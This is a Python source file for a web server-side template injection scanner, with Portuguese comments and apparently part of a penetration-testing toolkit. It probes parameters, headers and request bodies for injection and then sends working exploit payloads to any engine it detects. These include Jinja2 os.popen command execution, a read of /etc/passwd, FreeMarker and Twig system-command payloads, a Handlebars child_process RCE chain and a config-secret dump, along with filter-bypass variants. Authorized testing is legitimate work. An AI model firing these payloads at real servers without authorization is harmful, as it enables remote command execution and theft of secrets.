#!/usr/bin/env python3

"""Modulo de deteccao de Server-Side Template Injection (SSTI).



Testa se o servidor e vulneravel a injecao de template injection via HTTP:

  - Jinja2 (Python) — {{7*7}} = 49

  - Twig (PHP) — {{7*7}} = 49

  - Freemarker (Java) — ${7*7} = 49

  - Mako (Python) — ${7*7} = 49

  - Pebble (Java) — {{7*7}} = 49

  - Smarty (PHP) — {7*7} = 49

  - ERB (Ruby) — <%= 7*7 %> = 49

  - Velocity (Java) — #set($x=7*7)${x} = 49



Fluxo:

  1. Envia payloads de deteccao em cada engine

  2. Verifica se a resposta contem o resultado esperado (49)

  3. Se detectado, envia payloads de exploit (config, OS command, file read)

  4. Classifica: detectado, blocked, error

  5. Retorna resultado consolidado com severidade

"""

import argparse
import logging
import re
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_concurrent,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)
from mytools.web.secondorder import get_verify_payload, verify_positive

logger = logging.getLogger("mytools.sstidetect")


_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": ["jinja2_detect", "twig_detect", "freemarker_detect", "mako_detect"],
    "exploit": ["jinja2_config", "jinja2_os", "freemarker_exec"],
    "bypass": ["jinja2_space", "jinja2_string", "twig_space"],
    "header": ["ua_ssti", "referer_ssti", "cookie_ssti"],
    "body": ["json_ssti", "form_ssti", "xml_ssti"],
}


_DETECT_PAYLOADS: list[tuple[str, str, str]] = [
    ("jinja2_math", "{{7*7}}", "49"),
    ("jinja2_math2", "{{7*'7'}}", "7777777"),
    ("jinja2_config", "{{config.items()}}", "config"),
    ("jinja2_class", "{{''.__class__.__mro__[1].__subclasses__()}}", "class"),
    ("twig_math", "{{7*7}}", "49"),
    ("twig_filter", "{{7*7|number_format}}", "49"),
    ("freemarker_math", "${7*7}", "49"),
    ("freemarker_assign", "<#assign x=7*7>${x}", "49"),
    ("mako_math", "${7*7}", "49"),
    ("mako_python", "${7*7}", "49"),
    ("pebble_math", "{{7*7}}", "49"),
    ("smarty_math", "{7*7}", "49"),
    ("erb_math", "<%= 7*7 %>", "49"),
    ("velocity_math", "#set($x=7*7)${x}", "49"),
    ("velocity_exec", "#set($str=$class.forName('java.lang.Runtime'))", "class"),
    ("handlebars_math", "{{7*7}}", "49"),
    (
        "handlebars_helper",
        '{{#with "s" as |s|}}{{#with "e"}}{{/with}}{{/with}}',
        "handlebars",
    ),
    ("go_math", "{{7*7}}", "49"),
    ("go_println", '{{println "test"}}', "test"),
    ("blade_math", "{{7*7}}", "49"),
    ("blade_php", "@php echo 7*7 @endphp", "49"),
    ("razor_math", "@(7*7)", "49"),
    ("razor_expression", "@(1+1)", "2"),
]


_EXPLOIT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "jinja2_config_dump",
        "{{config}}",
        ["SECRET", "KEY", "DATABASE", "password", "secret"],
    ),
    (
        "jinja2_os_popen",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        ["uid=", "gid="],
    ),
    (
        "jinja2_file_read",
        "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['open']('/etc/passwd').read()}}",
        ["root:", "/bin/bash"],
    ),
    (
        "freemarker_exec",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        ["uid=", "gid="],
    ),
    (
        "freemarker_object",
        "<#assign classloader=object.class.protectionDomain.classLoader><#assign owc=classloader.loadClass('freemarker.template.ObjectWrapper')>",
        ["class", "ObjectWrapper"],
    ),
    (
        "twig_os_exec",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        ["uid=", "gid="],
    ),
    (
        "handlebars_rce",
        '{{#with "s" as |s|}}{{#with "e"}}{{#with split as |c|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\')"}}{{#each c}}{{#with (string.sub apply=0) as |crtk|}}{{crtk this (lookup string.sub "constructor")}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
        ["uid=", "gid="],
    ),
    (
        "go_env",
        '{{env "PATH"}}',
        ["/", "bin", "usr"],
    ),
    (
        "blade_config",
        "{{config('app.name')}}",
        ["Laravel", "config", "app"],
    ),
    (
        "razor_process",
        '@(System.Environment.GetEnvironmentVariable("PATH"))',
        ["/", "bin", "usr"],
    ),
]


_BYPASS_PAYLOADS: list[tuple[str, str, str]] = [
    ("jinja2_space", "{{ 7*7 }}", "49"),
    (
        "jinja2_plus",
        "{{7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7}}",
        "49",
    ),
    ("jinja2_string_concat", "{{'{{7*7}}'}}", "{{7*7}}"),
    ("jinja2_hex", '{{config["\\x53\\x45\\x43\\x52\\x45\\x54"]}}', "SECRET"),
    ("twig_space", "{{ 7 * 7 }}", "49"),
    ("twig_comment", "{# comment #}{{7*7}}", "49"),
    ("freemarker_space", "${ 7*7 }", "49"),
    ("freemarker_comment", "<#-- comment -->${7*7}", "49"),
    ("mako_space", "${ 7*7 }", "49"),
    ("erb_space", "<%= 7*7 %>", "49"),
    ("velocity_space", "#set( $x = 7*7 ) ${x}", "49"),
    ("handlebars_space", "{{ 7*7 }}", "49"),
    ("go_space", "{{ 7*7 }}", "49"),
    ("blade_space", "{{ 7*7 }}", "49"),
    ("razor_space", "@( 7*7 )", "49"),
]


_HEADER_NAMES: list[str] = [
    "User-Agent",
    "Referer",
    "Cookie",
    "X-Forwarded-For",
    "Accept-Language",
    "X-Custom-Header",
]


_PARAMS: list[str] = [
    "name",
    "q",
    "search",
    "template",
    "page",
    "file",
    "include",
    "body",
    "render",
    "view",
]


@dataclass(frozen=True, slots=True)
class SSTIAttempt:
    """Tentativa individual de SSTI."""

    technique: str

    category: str

    url: str

    payload: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    engine_detected: str

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class SSTIResult:
    """Resultado consolidado do scan de SSTI."""

    target: str

    baseline_status: int

    baseline_size: int

    tls: bool

    attempts: list[SSTIAttempt]

    vulnerable_engines: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


async def _test_baseline(
    client: httpx.AsyncClient,
    url: str,
) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""

    try:
        resp = await client.get(url, follow_redirects=False)

        return resp.status_code, len(resp.content), resp.content

    except httpx.RequestError:
        return 0, 0, b""


def _extract_engine(technique: str) -> str:
    """Extrai nome da engine a partir da tecnica."""

    for engine in [
        "jinja2",
        "twig",
        "freemarker",
        "mako",
        "pebble",
        "smarty",
        "erb",
        "velocity",
        "handlebars",
        "go",
        "blade",
        "razor",
    ]:
        if engine in technique.lower():
            return engine

    return "unknown"


def _check_response(body: bytes, expected: str) -> bool:
    """Verifica se a resposta contem o valor esperado.

    Valores curtos com caracteres alfanumericos ("49", "class") usam
    word-boundary para nao casar como substring de palavras maiores.
    Longas strings unicas ou valores com pontuacao usam substring.
    """

    text = body.decode("utf-8", errors="ignore")

    if not expected:
        return False

    if re.search(r"\w", expected) and len(expected) < 6:
        return bool(re.search(rf"\b{re.escape(expected)}\b", text))

    return expected in text


def _check_exploit(body: bytes, indicators: list[str]) -> tuple[bool, str]:
    """Verifica se a resposta contem indicadores de exploit."""

    text = body.decode("utf-8", errors="ignore")

    for indicator in indicators:
        if indicator.lower() in text.lower():
            return True, indicator

    return False, ""


async def _test_param_ssti(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSTIAttempt]:
    """Testa SSTI em parametros GET/POST."""

    parsed = urlparse(base_url)

    original_params = parse_qs(parsed.query, keep_blank_values=True)

    attempts: list[SSTIAttempt] = []

    status_base, size_base, _ = baseline

    for param in _PARAMS[:5]:
        for name, payload, expected in _DETECT_PAYLOADS:
            new_params = {
                k: v[0] if isinstance(v, list) else v
                for k, v in original_params.items()
            }

            new_params[param] = payload

            new_query = urlencode(new_params, doseq=True)

            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                resp = await client.get(test_url, follow_redirects=False)

                status_test = resp.status_code

                size_test = len(resp.content)

                detected = _check_response(resp.content, expected)

                engine = _extract_engine(name) if detected else ""

                vuln = detected

                # Second-order verification for detection
                details = f"Param {param}: {name}" + (
                    f" -> ENGINE={engine}" if detected else ""
                )
                if detected:
                    verify = get_verify_payload("sstidetect", "detect")
                    if verify:
                        v_payload, v_indicators = verify
                        new_v_params = dict(new_params)
                        new_v_params[param] = v_payload
                        v_new_query = urlencode(new_v_params, doseq=True)
                        v_url = urlunparse(parsed._replace(query=v_new_query))
                        confirmed, v_found = await verify_positive(
                            client, v_url, v_indicators
                        )
                        if not confirmed:
                            detected = False
                            engine = ""
                            vuln = False
                            details += f" [2nd-order failed: {v_found or 'no match'}]"
                        else:
                            details += f" [2nd-order confirmed: {v_found}]"

                attempts.append(
                    SSTIAttempt(
                        technique=f"{name}_{param}",
                        category="detect",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=status_test,
                        size_baseline=size_base,
                        size_test=size_test,
                        status_changed=status_test != status_base,
                        size_changed=abs(size_test - size_base) > 50,
                        engine_detected=engine,
                        vulnerable=vuln,
                        details=f"Param {param}: {name}"
                        + (f" -> ENGINE={engine}" if detected else ""),
                        error="",
                        exploit="{{7*7}}" if vuln else "",
                        tool="Tplmap",
                    )
                )

            except httpx.RequestError as exc:
                attempts.append(
                    SSTIAttempt(
                        technique=f"{name}_{param}",
                        category="detect",
                        url=test_url,
                        payload=payload,
                        status_baseline=status_base,
                        status_test=0,
                        size_baseline=size_base,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        engine_detected="",
                        vulnerable=False,
                        details="",
                        error=str(exc)[:100],
                    )
                )

    return attempts


async def _test_header_ssti(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSTIAttempt]:
    """Testa SSTI em headers HTTP."""

    attempts: list[SSTIAttempt] = []

    status_base, size_base, _ = baseline

    for header in _HEADER_NAMES[:3]:
        for name, payload, expected in _DETECT_PAYLOADS:
            try:
                resp = await client.get(
                    base_url,
                    headers={header: payload},
                    follow_redirects=False,
                )

                status_test = resp.status_code

                size_test = len(resp.content)

                detected = _check_response(resp.content, expected)

                engine = _extract_engine(name) if detected else ""

                vuln = detected

                # Second-order verification for detection
                details = f"Header {header}: {name}" + (
                    f" -> ENGINE={engine}" if detected else ""
                )
                if detected:
                    verify = get_verify_payload("sstidetect", "detect")
                    if verify:
                        v_payload, v_indicators = verify
                        try:
                            v_resp = await client.get(
                                base_url,
                                headers={header: v_payload},
                                follow_redirects=False,
                            )
                        except httpx.RequestError:
                            v_resp = None
                        confirmed = False
                        v_found = ""
                        if v_resp is not None:
                            for v_ind in v_indicators:
                                if v_ind in v_resp.content:
                                    confirmed = True
                                    v_found = v_ind.decode("utf-8", errors="replace")
                                    break
                        if not confirmed:
                            detected = False
                            engine = ""
                            vuln = False
                            details += f" [2nd-order failed: {v_found or 'no match'}]"
                        else:
                            details += f" [2nd-order confirmed: {v_found}]"

                attempts.append(
                    SSTIAttempt(
                        technique=f"{name}_{header.lower().replace('-', '_')}",
                        category="header",
                        url=base_url,
                        payload=f"{header}: {payload}",
                        status_baseline=status_base,
                        status_test=status_test,
                        size_baseline=size_base,
                        size_test=size_test,
                        status_changed=status_test != status_base,
                        size_changed=abs(size_test - size_base) > 50,
                        engine_detected=engine,
                        vulnerable=vuln,
                        details=f"Header {header}: {name}"
                        + (f" -> ENGINE={engine}" if detected else ""),
                        error="",
                        exploit="{{7*7}}" if vuln else "",
                        tool="Tplmap",
                    )
                )

            except httpx.RequestError as exc:
                attempts.append(
                    SSTIAttempt(
                        technique=f"{name}_{header.lower().replace('-', '_')}",
                        category="header",
                        url=base_url,
                        payload=f"{header}: {payload}",
                        status_baseline=status_base,
                        status_test=0,
                        size_baseline=size_base,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        engine_detected="",
                        vulnerable=False,
                        details="",
                        error=str(exc)[:100],
                    )
                )

    return attempts


async def _test_body_ssti(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSTIAttempt]:
    """Testa SSTI em bodies (JSON, form, XML)."""

    attempts: list[SSTIAttempt] = []

    status_base, size_base, _ = baseline

    for name, payload, expected in _DETECT_PAYLOADS:
        json_body = {"input": payload, "name": payload, "template": payload}

        try:
            resp = await client.post(
                base_url,
                json=json_body,
                follow_redirects=False,
            )

            status_test = resp.status_code

            size_test = len(resp.content)

            detected = _check_response(resp.content, expected)

            engine = _extract_engine(name) if detected else ""

            vuln = detected

            # Second-order verification for detection
            details = f"JSON: {name}" + (f" -> ENGINE={engine}" if detected else "")
            if detected:
                verify = get_verify_payload("sstidetect", "detect")
                if verify:
                    v_payload, v_indicators = verify
                    try:
                        v_resp = await client.post(
                            base_url,
                            json={
                                "input": v_payload,
                                "name": v_payload,
                                "template": v_payload,
                            },
                            follow_redirects=False,
                        )
                    except httpx.RequestError:
                        v_resp = None
                    confirmed = False
                    v_found = ""
                    if v_resp is not None:
                        for v_ind in v_indicators:
                            if v_ind in v_resp.content:
                                confirmed = True
                                v_found = v_ind.decode("utf-8", errors="replace")
                                break
                    if not confirmed:
                        detected = False
                        engine = ""
                        vuln = False
                        details += f" [2nd-order failed: {v_found or 'no match'}]"
                    else:
                        details += f" [2nd-order confirmed: {v_found}]"

            attempts.append(
                SSTIAttempt(
                    technique=f"{name}_json",
                    category="body",
                    url=base_url,
                    payload=f"json: {payload}",
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    engine_detected=engine,
                    vulnerable=vuln,
                    details=f"JSON: {name}"
                    + (f" -> ENGINE={engine}" if detected else ""),
                    error="",
                    exploit="{{7*7}}" if vuln else "",
                    tool="Tplmap",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                SSTIAttempt(
                    technique=f"{name}_json",
                    category="body",
                    url=base_url,
                    payload=f"json: {payload}",
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    engine_detected="",
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                )
            )

    for name, payload, expected in _DETECT_PAYLOADS:
        form_data = {"input": payload, "name": payload, "template": payload}

        try:
            resp = await client.post(
                base_url,
                data=form_data,
                follow_redirects=False,
            )

            status_test = resp.status_code

            size_test = len(resp.content)

            detected = _check_response(resp.content, expected)

            engine = _extract_engine(name) if detected else ""

            vuln = detected

            # Second-order verification for detection
            details = f"Form: {name}" + (f" -> ENGINE={engine}" if detected else "")
            if detected:
                verify = get_verify_payload("sstidetect", "detect")
                if verify:
                    v_payload, v_indicators = verify
                    try:
                        v_resp = await client.post(
                            base_url,
                            data={
                                "input": v_payload,
                                "name": v_payload,
                                "template": v_payload,
                            },
                            follow_redirects=False,
                        )
                    except httpx.RequestError:
                        v_resp = None
                    confirmed = False
                    v_found = ""
                    if v_resp is not None:
                        for v_ind in v_indicators:
                            if v_ind in v_resp.content:
                                confirmed = True
                                v_found = v_ind.decode("utf-8", errors="replace")
                                break
                    if not confirmed:
                        detected = False
                        engine = ""
                        vuln = False
                        details += f" [2nd-order failed: {v_found or 'no match'}]"
                    else:
                        details += f" [2nd-order confirmed: {v_found}]"

            attempts.append(
                SSTIAttempt(
                    technique=f"{name}_form",
                    category="body",
                    url=base_url,
                    payload=f"form: {payload}",
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    engine_detected=engine,
                    vulnerable=vuln,
                    details=f"Form: {name}"
                    + (f" -> ENGINE={engine}" if detected else ""),
                    error="",
                    exploit="{{7*7}}" if vuln else "",
                    tool="Tplmap",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                SSTIAttempt(
                    technique=f"{name}_form",
                    category="body",
                    url=base_url,
                    payload=f"form: {payload}",
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    engine_detected="",
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                )
            )

    return attempts


async def _test_exploit(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
    engines: list[str],
) -> list[SSTIAttempt]:
    """Testa exploits apenas nas engines detectadas."""

    attempts: list[SSTIAttempt] = []

    status_base, size_base, _ = baseline

    relevant_exploits = [
        (n, p, ind) for n, p, ind in _EXPLOIT_PAYLOADS if any(e in n for e in engines)
    ]

    if not relevant_exploits:
        return attempts

    parsed = urlparse(base_url)

    for name, payload, indicators in relevant_exploits[:3]:
        engine = _extract_engine(name)

        new_params = {"input": payload, "template": payload}

        new_query = urlencode(new_params, doseq=True)

        test_url = urlunparse(parsed._replace(query=new_query))

        try:
            resp = await client.get(test_url, follow_redirects=False)

            status_test = resp.status_code

            size_test = len(resp.content)

            found, indicator = _check_exploit(resp.content, indicators)

            engine = _extract_engine(name)

            attempts.append(
                SSTIAttempt(
                    technique=f"exploit_{name}",
                    category="exploit",
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    engine_detected=engine,
                    vulnerable=found,
                    details=f"Exploit {name}"
                    + (f" -> FOUND={indicator}" if found else ""),
                    error="",
                    exploit="{{7*7}}" if found else "",
                    tool="Tplmap",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                SSTIAttempt(
                    technique=f"exploit_{name}",
                    category="exploit",
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    engine_detected=engine,
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                )
            )

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSTIAttempt]:
    """Testa bypass de filtros SSTI."""

    attempts: list[SSTIAttempt] = []

    status_base, size_base, _ = baseline

    parsed = urlparse(base_url)

    for name, payload, expected in _BYPASS_PAYLOADS:
        engine = _extract_engine(name)

        new_params = {"input": payload, "template": payload}

        new_query = urlencode(new_params, doseq=True)

        test_url = urlunparse(parsed._replace(query=new_query))

        try:
            resp = await client.get(test_url, follow_redirects=False)

            status_test = resp.status_code

            size_test = len(resp.content)

            detected = _check_response(resp.content, expected)

            attempts.append(
                SSTIAttempt(
                    technique=f"bypass_{name}",
                    category="bypass",
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    engine_detected=engine,
                    vulnerable=detected,
                    details=f"Bypass {name}"
                    + (f" -> ENGINE={engine}" if detected else ""),
                    error="",
                    exploit="{{7*7}}" if detected else "",
                    tool="Tplmap",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                SSTIAttempt(
                    technique=f"bypass_{name}",
                    category="bypass",
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    engine_detected=engine,
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                )
            )

    return attempts


def print_results(result: SSTIResult) -> None:
    """Exibe resultados formatados."""

    tls_tag = (
        color("[HTTPS]", Cyber.GREEN, Cyber.BOLD)
        if result.tls
        else color("[HTTP]", Cyber.YELLOW)
    )

    print(color("\n" + "=" * 60, Cyber.GRAY))

    print(
        color("  SSTI (Server-Side Template Injection) SCANNER", Cyber.RED, Cyber.BOLD)
    )

    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Alvo:       {result.target}", Cyber.CYAN))

    print(color(f"  TLS:        {tls_tag}", Cyber.WHITE))

    print(
        color(
            f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.GRAY,
        )
    )

    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_engines = result.vulnerable_engines

    if vuln_engines:
        print(
            color(
                f"\n  [!] {len(vuln_engines)} ENGINES DETECTADAS", Cyber.RED, Cyber.BOLD
            )
        )

        for eng in vuln_engines:
            print(color(f"      [!] {eng.upper()}", Cyber.RED))

            a = next((a for a in result.attempts if a.engine_detected == eng), None)

            if a:
                print_exploit_info(a.exploit, a.tool)

        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))

    else:
        print(color("\n  [+] Nenhum SSTI detectado", Cyber.GREEN, Cyber.BOLD))

        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues

    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))

        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]

    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))

        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan SSTI."""

    tls = target.startswith("https")

    client = create_async_client(timeout=timeout, proxy=proxy)

    try:
        logger.info("Conectando a %s...", target)

        baseline = await _test_baseline(client, target)

        if baseline[0] == 0:
            logger.error("Falha ao conectar no alvo")

            return 1

        logger.info("Baseline: %d (%d bytes)", baseline[0], baseline[1])

        run_categories = categories or list(_CATEGORY_MAP.keys())

        all_attempts: list[SSTIAttempt] = []

        coros = []

        for cat in run_categories:
            if cat == "detect":
                coros.append(_test_param_ssti(client, target, baseline))

            elif cat == "header":
                coros.append(_test_header_ssti(client, target, baseline))

            elif cat == "body":
                coros.append(_test_body_ssti(client, target, baseline))

            elif cat == "bypass":
                coros.append(_test_bypass(client, target, baseline))

        if coros:
            results_list = await run_concurrent(coros, concurrency)

            for r in results_list:
                if isinstance(r, list):
                    all_attempts.extend(r)

        engines_found = list(
            {
                a.engine_detected
                for a in all_attempts
                if a.vulnerable and a.engine_detected
            }
        )

        if engines_found and "exploit" in run_categories:
            exploit_attempts = await _test_exploit(
                client, target, baseline, engines_found
            )

            all_attempts.extend(exploit_attempts)

        blocked = [
            a.technique for a in all_attempts if not a.vulnerable and not a.error
        ]

        issues: list[str] = [
            f"VULN: {att.technique} - {att.details}"
            for att in all_attempts
            if att.vulnerable
        ]

        overall = "vulnerable" if engines_found else "secure"

        result = SSTIResult(
            target=target,
            baseline_status=baseline[0],
            baseline_size=baseline[1],
            tls=tls,
            attempts=all_attempts,
            vulnerable_engines=engines_found,
            blocked_techniques=blocked,
            issues=issues,
            overall_status=overall,
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)

        if output_file:
            write_output(output_file, asdict(result))

        logger.info(
            "SSTI scan concluido: %d testes, engines=%s",
            len(all_attempts),
            engines_found,
        )

        return 1 if engines_found else 0

    finally:
        await client.aclose()


banner_art = create_banner(
    r"""

     _____ _____ ____  __  __ ___ _   _    _    _

    / ____/ ____|  _ \|  \/  |_ _| \ | |  / \  | |

   | (___| (___ | |_) | |\/| || ||  \| | / _ \ | |

    \___ \\___ \|  _ <| |  | || || |\  |/ ___ \| |___

    ____) |___) | |_) | |__| || |_| | \_/ _ \ \_____|

   |_____/_____/|____/|______|_____|_/_/ ___\_\_____|

                                        |_|

    """,
    "SSTI — detecta Server-Side Template Injection em web apps",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""

    parser = argparse.ArgumentParser(
        prog="mytools-sstdetect",
        description="SSTI — detecta Server-Side Template Injection em web apps",
    )

    parser.add_argument("url", help="URL alvo (ex: https://example.com)")

    parser.add_argument(
        "-c",
        "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )

    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan SSTI a partir de argumentos parseados."""

    init_scanner(args)

    logger.info("SSTI scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None):
        categories = [args.category]

    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""

    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="ssti> ",
        description="SSTI interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c exploit\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
